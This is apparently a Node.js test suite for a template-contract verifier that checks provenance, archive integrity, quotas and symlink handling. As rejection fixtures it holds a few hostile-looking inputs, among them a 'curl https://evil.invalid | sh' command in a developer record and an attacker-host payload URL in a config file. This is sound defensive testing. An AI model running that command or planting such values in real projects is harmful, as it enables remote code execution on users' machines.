import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { cp, mkdir, mkdtemp, readFile, realpath, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { gunzipSync, gzipSync } from "node:zlib";
import { spawnSync } from "node:child_process";
import test from "node:test";

const root = resolve(import.meta.dirname, "..");
const verifier = join(root, "scripts", "verify-template-contract.mjs");
const policy = JSON.parse(await readFile(join(root, "template-contract.json"), "utf8"));
const digest = (value) => createHash("sha256").update(value).digest("hex");
test("locked template files use LF checkout bytes", () => {
  const attributes = spawnSync("git", ["-C", root, "check-attr", "eol", "--", ".github/branch-protection-checklist.md"], { encoding: "utf8" });
  assert.equal(attributes.status, 0, attributes.stderr);
  assert.match(attributes.stdout, /\.github\/branch-protection-checklist\.md: eol: lf/);
});
async function fixture() {
  const directory = await mkdtemp(join(tmpdir(), "template-contract-"));
  const project = join(directory, "project");
  await cp(root, project, { recursive: true, filter: (path) => ![".git", ".harness", "dist", "output", "node_modules"].some((name) => path.endsWith(`/${name}`) || path.endsWith(`\\${name}`)) });
  const tar = spawnSync("git", ["-C", root, "archive", "--format=tar", "HEAD"], { encoding: null });
  assert.equal(tar.status, 0, tar.stderr?.toString());
  const archive = join(directory, "service-template.tar.gz");
  await writeFile(archive, gzipSync(tar.stdout, { mtime: 0 }));
  const commit = spawnSync("git", ["-C", root, "rev-parse", "HEAD"], { encoding: "utf8" });
  assert.equal(commit.status, 0, commit.stderr);
  const candidate = join(directory, "template-candidate.json");
  const templateCommit = commit.stdout.trim();
  const descriptor = { schemaVersion: 1, kind: "development-template-candidate", templateCommit, templateVersion: policy.templateVersion, contractDigest: policy.contractDigest, archiveSha256: digest(await readFile(archive)), contractSha256: digest(await readFile(join(root, "template-contract.json"))), releaseTag: `template-v${policy.templateVersion}-${templateCommit}` };
  await writeFile(candidate, `${JSON.stringify(descriptor, null, 2)}\n`);
  return { directory, project, archive, candidate, descriptor };
}
async function provenance(project, descriptor, origin = { kind: "local-archive", archiveSha256: descriptor.archiveSha256 }) {
  await writeFile(join(project, "template-provenance.json"), `${JSON.stringify({ schemaVersion: 1, templateRepository: "service-lasso/service-template", templateCommit: descriptor.templateCommit, templateVersion: descriptor.templateVersion, contractDigest: descriptor.contractDigest, origin }, null, 2)}\n`);
}
const repeated = (first, length) => `${first}${"a".repeat(length - 1)}`;
function maximumGithubOrigin() { return { kind: "github-derived", repository: `${"o".repeat(39)}/${"r".repeat(100)}` }; }
function maximumManifest(baseline, repository) {
  const manifest = structuredClone(baseline);
  manifest.id = repeated("a", 63);
  manifest.name = repeated("A", 120);
  manifest.description = repeated("A", 512);
  manifest.version = `1.0.0-${"a".repeat(58)}`;
  manifest.meta.developers = Array.from({ length: 8 }, () => ({ name: repeated("A", 120) }));
  manifest.meta.repository.url = `https://github.com/${repository}.git`;
  manifest.meta.tags = Array.from({ length: 12 }, () => repeated("a", 48));
  return manifest;
}
const json = (value) => `${JSON.stringify(value, null, 2)}\n`;
function run(fixture) { return spawnSync(process.execPath, [verifier, "--template-root", root, "--project-root", fixture.project, "--candidate", fixture.candidate, "--candidate-archive", fixture.archive], { encoding: "utf8" }); }
async function derivedFixture(t) { const value = await fixture(); t.after(() => rm(value.directory, { recursive: true, force: true })); await provenance(value.project, value.descriptor); return value; }
async function bindArchive(value) { value.descriptor.archiveSha256 = digest(await readFile(value.archive)); await writeFile(value.candidate, `${JSON.stringify(value.descriptor, null, 2)}\n`); await provenance(value.project, value.descriptor); }
function rewriteTarHeader(tar, name, mutate) { const offset = tar.indexOf(Buffer.from(`${name}\0`, "ascii")); assert.notEqual(offset, -1, `fixture archive must include ${name}`); mutate(offset); tar.fill(0x20, offset + 148, offset + 156); const checksum = tar.subarray(offset, offset + 512).reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, "0"); tar.write(`${checksum}\0 `, offset + 148, "ascii"); }
function terminalOffset(tar) { for (let offset = 0; offset + 1024 <= tar.length; offset += 512) if (tar.subarray(offset, offset + 512).every((byte) => byte === 0) && tar.subarray(offset + 512, offset + 1024).every((byte) => byte === 0)) return offset; assert.fail("fixture archive must contain a two-block terminal record"); }
function tarRecord(name, type, body = Buffer.alloc(0)) { const header = Buffer.alloc(512); header.write(name, 0, "ascii"); header.write(type === "5" ? "0000775\0" : type === "g" ? "0000666\0" : "0000664\0", 100, "ascii"); header.write(body.length.toString(8).padStart(11, "0") + "\0", 124, "ascii"); header.fill(0x20, 148, 156); header.write(type, 156, "ascii"); header.write("ustar\0", 257, "ascii"); header.write("00", 263, "ascii"); const checksum = header.reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, "0"); header.write(`${checksum}\0 `, 148, "ascii"); return Buffer.concat([header, body, Buffer.alloc((512 - (body.length % 512)) % 512)]); }
function syntheticTar(records) { return Buffer.concat([...records, Buffer.alloc(1024)]); }
test("valid local archive project is admitted using the owner candidate tuple", async (t) => { const value = await derivedFixture(t); const result = run(value); assert.equal(result.status, 0, result.stderr); assert.match(result.stdout, /"verified": true/); });
test("safe identity, GitHub identity and example configuration changes are admitted", async (t) => { const value = await fixture(); t.after(() => rm(value.directory, { recursive: true, force: true })); const origin = { kind: "github-derived", repository: "example/lasso-weather" }; await provenance(value.project, value.descriptor, origin); const manifest = JSON.parse(await readFile(join(value.project, "service.json"), "utf8")); manifest.id = "weather-service"; manifest.name = "Weather Service"; manifest.meta.repository.url = "https://github.com/example/lasso-weather.git"; await writeFile(join(value.project, "service.json"), `${JSON.stringify(manifest, null, 2)}\n`); await writeFile(join(value.project, "config", "example.env"), "ECHO_MESSAGE=weather\n"); const result = run(value); assert.equal(result.status, 0, result.stderr); });
test("authoring JSON uses canonical syntax and rejects whitespace padding", async (t) => {
  const value = await derivedFixture(t);
  const manifestPath = join(value.project, "service.json");
  const manifest = JSON.parse(await readFile(manifestPath, "utf8"));
  manifest.name = "Canonical Service";
  await writeFile(manifestPath, json(manifest));
  let result = run(value); assert.equal(result.status, 0, result.stderr);
  await writeFile(manifestPath, `${json(manifest)} `);
  result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /canonical_json/);
});
test("closed authoring budgets admit their exact maximum and reject each one-byte excess", async (t) => {
  const accepted = await fixture(); t.after(() => rm(accepted.directory, { recursive: true, force: true }));
  const origin = maximumGithubOrigin();
  await provenance(accepted.project, accepted.descriptor, origin);
  const manifestPath = join(accepted.project, "service.json");
  const manifest = maximumManifest(JSON.parse(await readFile(manifestPath, "utf8")), origin.repository);
  await writeFile(manifestPath, json(manifest));
  const provenanceBytes = await readFile(join(accepted.project, "template-provenance.json"));
  assert.equal(Buffer.byteLength(json(manifest)), policy.quotas.maximumManifestBytes);
  assert.equal(provenanceBytes.length, policy.quotas.maximumProvenanceBytes);
  await writeFile(join(accepted.project, "config", "example.env"), `ECHO_MESSAGE=${"x".repeat(policy.quotas.maximumConfigBytes - 14)}\n`);
  let result = run(accepted); assert.equal(result.status, 0, result.stderr);
  const total = policy.inventory.filter((entry) => ![policy.authoring.manifest.path, ...policy.authoring.configuration.allowedPaths].includes(entry.path)).reduce((sum, entry) => sum + entry.bytes, 0) + Buffer.byteLength(await readFile(join(accepted.project, "template-contract.json"))) + policy.quotas.maximumManifestBytes + policy.quotas.maximumProvenanceBytes + policy.quotas.maximumConfigBytes;
  assert.equal(total, policy.quotas.maximumTotalBytes);
  await writeFile(join(accepted.project, "config", "example.env"), `ECHO_MESSAGE=${"x".repeat(policy.quotas.maximumConfigBytes - 13)}\n`);
  result = run(accepted); assert.notEqual(result.status, 0); assert.match(result.stderr, /Project exceeds file or byte quota/);

  const manifestOver = await derivedFixture(t); const originalManifest = JSON.parse(await readFile(join(manifestOver.project, "service.json"), "utf8")); await writeFile(join(manifestOver.project, "service.json"), `${json(maximumManifest(originalManifest, origin.repository))} `); result = run(manifestOver); assert.notEqual(result.status, 0); assert.match(result.stderr, /Manifest exceeds its closed byte budget/);
  const provenanceOver = await fixture(); t.after(() => rm(provenanceOver.directory, { recursive: true, force: true })); await provenance(provenanceOver.project, provenanceOver.descriptor, origin); await writeFile(join(provenanceOver.project, "template-provenance.json"), `${await readFile(join(provenanceOver.project, "template-provenance.json"), "utf8")} `); result = run(provenanceOver); assert.notEqual(result.status, 0); assert.match(result.stderr, /Provenance exceeds its closed byte budget/);
});
test("the preserved configuration budget remains independently enforced", async (t) => {
  const value = await derivedFixture(t);
  await writeFile(join(value.project, "config", "example.env"), `ECHO_MESSAGE=${"x".repeat(policy.quotas.maximumConfigBytes - 13)}\n`);
  const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /Configuration exceeds byte quota/);
});
test("GitHub-derived provenance validates the repository URL even when the baseline URL is unchanged", async (t) => {
  const mismatch = await fixture(); t.after(() => rm(mismatch.directory, { recursive: true, force: true })); await provenance(mismatch.project, mismatch.descriptor, { kind: "github-derived", repository: "example/lasso-weather" }); let result = run(mismatch); assert.notEqual(result.status, 0); assert.match(result.stderr, /github_identity/);
  const matching = await fixture(); t.after(() => rm(matching.directory, { recursive: true, force: true })); await provenance(matching.project, matching.descriptor, { kind: "github-derived", repository: "service-lasso/service-template" }); result = run(matching); assert.equal(result.status, 0, result.stderr);
});
test("invented commit and archive digests are denied even when provenance is well formed", async (t) => { const value = await derivedFixture(t); const templateCommit = "b".repeat(40); const invented = { ...value.descriptor, templateCommit, releaseTag: `template-v${value.descriptor.templateVersion}-${templateCommit}`, archiveSha256: "a".repeat(64) }; await writeFile(value.candidate, `${JSON.stringify(invented, null, 2)}\n`); await provenance(value.project, invented); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /candidate_binding/); });
test("provenance cannot self-report an archive digest different from the candidate", async (t) => { const value = await derivedFixture(t); await provenance(value.project, value.descriptor, { kind: "local-archive", archiveSha256: "a".repeat(64) }); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /origin/); });
test("a candidate archive with forged noncanonical regular modes is denied from archive metadata", async (t) => {
  const value = await derivedFixture(t);
  const tar = gunzipSync(await readFile(value.archive));
  const headerOffset = tar.indexOf(Buffer.from(".gitattributes\0", "ascii"));
  assert.notEqual(headerOffset, -1, "fixture archive must include a regular locked file header");
  tar.write("0000666\0", headerOffset + 100, "ascii");
  tar.fill(0x20, headerOffset + 148, headerOffset + 156);
  const checksum = tar.subarray(headerOffset, headerOffset + 512).reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, "0");
  tar.write(`${checksum}\0 `, headerOffset + 148, "ascii");
  await writeFile(value.archive, gzipSync(tar, { mtime: 0 }));
  value.descriptor.archiveSha256 = digest(await readFile(value.archive));
  await writeFile(value.candidate, `${JSON.stringify(value.descriptor, null, 2)}\n`);
  await provenance(value.project, value.descriptor);
  const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /candidate_archive/);
});
test("a candidate archive rejects forged global PAX metadata", async (t) => {
  const value = await derivedFixture(t); const tar = gunzipSync(await readFile(value.archive)); const forged = Buffer.concat([tarRecord("pax_global_header", "g", Buffer.from(`52 comment=${"a".repeat(40)}\n`, "ascii")), tar]); await writeFile(value.archive, gzipSync(forged, { mtime: 0 })); await bindArchive(value); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /candidate_archive/);
});
test("archive policy byte substitution is denied even with a matching candidate digest", async (t) => {
  const value = await derivedFixture(t); const tar = gunzipSync(await readFile(value.archive)); const marker = Buffer.from('"templateVersion": "1.0.0-dev"', "utf8"); const offset = tar.indexOf(marker); assert.notEqual(offset, -1); tar.write('"templateVersion": "9.9.9-dev"', offset, "utf8"); await writeFile(value.archive, gzipSync(tar, { mtime: 0 })); await bindArchive(value); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /candidate_archive/);
});
test("derived policy byte substitution is denied", async (t) => {
  const value = await derivedFixture(t); const path = join(value.project, "template-contract.json"); await writeFile(path, (await readFile(path, "utf8")).replace('"templateVersion": "1.0.0-dev"', '"templateVersion": "9.9.9-dev"')); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /contract_policy/);
});
test("local archive cannot edit repository URL", async (t) => {
  const value = await derivedFixture(t); const manifest = JSON.parse(await readFile(join(value.project, "service.json"), "utf8")); manifest.meta.repository.url = "https://attacker.invalid/evil.git"; await writeFile(join(value.project, "service.json"), `${JSON.stringify(manifest, null, 2)}\n`); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /github_identity/);
});
test("GitHub-derived repository URLs enforce declared size and type constraints", async (t) => {
  const oversized = await fixture(); t.after(() => rm(oversized.directory, { recursive: true, force: true })); const owner = "o".repeat(130); const repository = "r".repeat(130); const origin = { kind: "github-derived", repository: `${owner}/${repository}` }; await provenance(oversized.project, oversized.descriptor, origin); const oversizedManifest = JSON.parse(await readFile(join(oversized.project, "service.json"), "utf8")); oversizedManifest.meta.repository.url = `https://github.com/${origin.repository}.git`; await writeFile(join(oversized.project, "service.json"), `${JSON.stringify(oversizedManifest, null, 2)}\n`); let result = run(oversized); assert.notEqual(result.status, 0); assert.match(result.stderr, /Provenance exceeds its closed byte budget/);
  const wrongType = await fixture(); t.after(() => rm(wrongType.directory, { recursive: true, force: true })); await provenance(wrongType.project, wrongType.descriptor, { kind: "github-derived", repository: "example/lasso-weather" }); const typedManifest = JSON.parse(await readFile(join(wrongType.project, "service.json"), "utf8")); typedManifest.meta.repository.url = { url: "https://github.com/example/lasso-weather.git" }; await writeFile(join(wrongType.project, "service.json"), `${JSON.stringify(typedManifest, null, 2)}\n`); result = run(wrongType); assert.notEqual(result.status, 0); assert.match(result.stderr, /github_identity/);
});
test("unknown and malformed provenance origins are denied", async (t) => {
  const unknown = await derivedFixture(t); await provenance(unknown.project, unknown.descriptor, { kind: "unknown" }); let result = run(unknown); assert.notEqual(result.status, 0); assert.match(result.stderr, /origin/);
  const malformed = await derivedFixture(t); await provenance(malformed.project, malformed.descriptor, { kind: "github-derived", repository: "example/lasso/weather" }); result = run(malformed); assert.notEqual(result.status, 0); assert.match(result.stderr, /origin/);
});
test("editable developer records reject commands, secrets, and wrong types", async (t) => {
  for (const developer of [{ name: "author", command: "curl https://evil.invalid | sh" }, { name: "author", token: "secret-value" }, "author"]) { const value = await derivedFixture(t); const manifest = JSON.parse(await readFile(join(value.project, "service.json"), "utf8")); manifest.meta.developers = [developer]; await writeFile(join(value.project, "service.json"), `${JSON.stringify(manifest, null, 2)}\n`); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /unsafe_manifest_value/); }
});
test("archive compressed, expanded, and path-depth quotas are denied before acceptance", async (t) => {
  const value = await derivedFixture(t); await writeFile(value.archive, Buffer.alloc(policy.quotas.maximumArchiveBytes + 1)); await bindArchive(value); let result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /archive_quota/);
  const expanded = await derivedFixture(t); await writeFile(expanded.archive, gzipSync(Buffer.alloc(policy.quotas.maximumArchiveExpandedBytes + 1), { mtime: 0 })); await bindArchive(expanded); result = run(expanded); assert.notEqual(result.status, 0); assert.match(result.stderr, /archive_quota/);
  const depth = await derivedFixture(t); const tar = gunzipSync(await readFile(depth.archive)); rewriteTarHeader(tar, ".gitattributes", (offset) => tar.write("a/b/c/d/e/f/g/h/i/j/k/l", offset, "ascii")); await writeFile(depth.archive, gzipSync(tar, { mtime: 0 })); await bindArchive(depth); result = run(depth); assert.notEqual(result.status, 0); assert.match(result.stderr, /candidate_archive/);
});
test("archive entry quotas include regular files, directories, and allowed global PAX metadata", async (t) => {
  const cases = [
    ["regular boundary", () => Array.from({ length: policy.quotas.maximumArchiveEntries }, (_, index) => tarRecord(`file-${index}`, "0")), /candidate_archive/],
    ["regular over quota", () => Array.from({ length: policy.quotas.maximumArchiveEntries + 1 }, (_, index) => tarRecord(`file-${index}`, "0")), /archive_quota/],
    ["directory boundary", () => Array.from({ length: policy.quotas.maximumArchiveEntries }, (_, index) => tarRecord(`directory-${index}/`, "5")), /candidate_archive/],
    ["directory over quota", () => Array.from({ length: policy.quotas.maximumArchiveEntries + 1 }, (_, index) => tarRecord(`directory-${index}/`, "5")), /archive_quota/],
    ["PAX metadata boundary", (value) => [tarRecord("pax_global_header", "g", Buffer.from(`52 comment=${value.descriptor.templateCommit}\n`, "ascii")), ...Array.from({ length: policy.quotas.maximumArchiveEntries - 1 }, (_, index) => tarRecord(`metadata-directory-${index}/`, "5"))], /candidate_archive/],
    ["PAX metadata over quota", (value) => [tarRecord("pax_global_header", "g", Buffer.from(`52 comment=${value.descriptor.templateCommit}\n`, "ascii")), ...Array.from({ length: policy.quotas.maximumArchiveEntries }, (_, index) => tarRecord(`metadata-directory-${index}/`, "5"))], /archive_quota/]
  ];
  for (const [name, makeRecords, expectation] of cases) { const value = await derivedFixture(t); await writeFile(value.archive, gzipSync(syntheticTar(makeRecords(value)), { mtime: 0 })); await bindArchive(value); const result = run(value); assert.notEqual(result.status, 0, name); assert.match(result.stderr, expectation, name); }
});
test("archive terminal record requires two zero blocks and only zero padding", async (t) => {
  const valid = await derivedFixture(t); const tar = gunzipSync(await readFile(valid.archive)); const footer = terminalOffset(tar);
  for (const [name, malformed] of [["truncated", tar.subarray(0, footer)], ["one-block", tar.subarray(0, footer + 512)], ["nonzero-trailing", Buffer.concat([tar, Buffer.from([1])])], ["concatenated", Buffer.concat([tar, tar])]]) {
    const value = await derivedFixture(t); await writeFile(value.archive, gzipSync(malformed, { mtime: 0 })); await bindArchive(value); const result = run(value); assert.notEqual(result.status, 0, name); assert.match(result.stderr, /candidate_archive/, name);
  }
});
test("altered executable baseline is denied", async (t) => { const value = await derivedFixture(t); await writeFile(join(value.project, "runtime", "linux", "echo-service.sh"), "#!/usr/bin/env bash\necho altered\n"); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /immutable_baseline/); });
test("arbitrary artifact source change is denied", async (t) => { const value = await derivedFixture(t); const manifest = JSON.parse(await readFile(join(value.project, "service.json"), "utf8")); manifest.artifact.source.repo = "attacker/example"; await writeFile(join(value.project, "service.json"), `${JSON.stringify(manifest, null, 2)}\n`); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /forbidden_manifest_change/); });
test("secret-like configuration is denied", async (t) => { const value = await derivedFixture(t); await writeFile(join(value.project, "config", "example.env"), "API_TOKEN=not-allowed\n"); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /unsafe_configuration/); });
test("arbitrary configuration URL is denied", async (t) => { const value = await derivedFixture(t); await writeFile(join(value.project, "config", "example.env"), "UPSTREAM=https://attacker.invalid/payload\n"); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /unsafe_configuration/); });
test("malformed provenance is denied", async (t) => { const value = await fixture(); t.after(() => rm(value.directory, { recursive: true, force: true })); await writeFile(join(value.project, "template-provenance.json"), "{bad json"); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /malformed_provenance/); });
async function assertLinkDenied(t, name, type) {
  const value = await derivedFixture(t);
  try { await symlink(type === "dir" ? join(value.project, "runtime") : join(value.project, "README.md"), join(value.project, name), type); } catch (error) { if (["EPERM", "EACCES", "ENOTSUP"].includes(error.code)) return t.skip(`link creation is unavailable: ${error.code}`); throw error; }
  const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /project_object/);
}
test("a reserved-name file symlink is denied before exclusion and allowlist", async (t) => assertLinkDenied(t, "node_modules", "file"));
test("a reserved-name directory symlink is denied before exclusion and traversal", async (t) => assertLinkDenied(t, "node_modules", "dir"));
async function assertGeneratorLinkDenied(t, type) {
  const directory = await mkdtemp(join(tmpdir(), "template-contract-generator-")); t.after(() => rm(directory, { recursive: true, force: true })); await mkdir(join(directory, "nested")); await writeFile(join(directory, "template-contract.json"), "{}\n"); await writeFile(join(directory, "README.md"), "fixture\n");
  for (const command of [["init", "-q", "--initial-branch=fixture-contract"], ["add", "."], ["-c", "user.name=Contract Test", "-c", "user.email=contract@example.invalid", "commit", "-qm", "fixture"]]) { const result = spawnSync("git", command, { cwd: directory, encoding: "utf8" }); assert.equal(result.status, 0, result.stderr); }
  try { await symlink(type === "dir" ? join(directory, "nested") : join(directory, "README.md"), join(directory, "node_modules"), type); } catch (error) { if (["EPERM", "EACCES", "ENOTSUP"].includes(error.code)) return t.skip(`link creation is unavailable: ${error.code}`); throw error; }
  const result = spawnSync(process.execPath, [join(root, "scripts", "generate-template-contract.mjs")], { cwd: directory, encoding: "utf8" }); assert.notEqual(result.status, 0); assert.match(result.stderr, /Template inventory rejects links and non-regular objects/);
}
test("contract generator rejects a reserved-name file link before exclusion", async (t) => assertGeneratorLinkDenied(t, "file"));
test("contract generator rejects a reserved-name directory link before exclusion", async (t) => assertGeneratorLinkDenied(t, "dir"));


for (const encoded of [false, true]) for (const aliasKind of ["directory", "script"]) test(`actual verifier ${aliasKind} physical alias ${encoded ? "encoded" : "ordinary"}: argument denial and verified project`, async (t) => {
  const value = await derivedFixture(t);
  const alias = join(value.directory, encoded ? "alias space # percent% é" : "alias");
  let script;
  if (aliasKind === "directory") {
    await symlink(root, alias, process.platform === "win32" ? "junction" : "dir");
    script = join(alias, "scripts", "verify-template-contract.mjs");
  } else {
    script = `${alias}.mjs`;
    try { await symlink(verifier, script, "file"); }
    catch (error) {
      if (process.platform === "win32" && ["EPERM", "EACCES"].includes(error.code)) { t.skip(`Direct file symbolic links unavailable: ${error.code}; mandatory directory-junction and Windows native gates remain required.`); return; }
      throw error;
    }
  }
  assert.equal(await realpath(script), await realpath(verifier)); assert.notEqual(script, await realpath(script));
  if (process.platform === "win32") assert.match(script, /^[A-Za-z]:\\/);
  for (const args of [[], ["--unrelated", "missing"]]) {
    const result = spawnSync(process.execPath, [script, ...args], { cwd: value.directory, encoding: "utf8", timeout: 15000 });
    assert.ifError(result.error); assert.equal(result.signal, null); assert.equal(result.status, 1); assert.equal(result.stdout, "");
    const diagnostic = JSON.parse(result.stderr); assert.equal(diagnostic.verified, false); assert.equal(diagnostic.code, "usage"); assert.match(diagnostic.message, /Usage: verify-template-contract|Unknown or duplicate verifier argument/);
  }
  const result = spawnSync(process.execPath, [script, "--template-root", root, "--project-root", value.project, "--candidate", value.candidate, "--candidate-archive", value.archive], { cwd: value.directory, encoding: "utf8", timeout: 15000 });
  assert.ifError(result.error); assert.equal(result.signal, null); assert.equal(result.status, 0, result.stderr); assert.equal(result.stderr, "");
  const verified = JSON.parse(result.stdout); assert.equal(verified.verified, true); assert.equal(verified.contractDigest, policy.contractDigest); assert.equal(verified.lockedFiles, policy.inventory.length); assert.equal(verified.provenance, "local-archive");
});
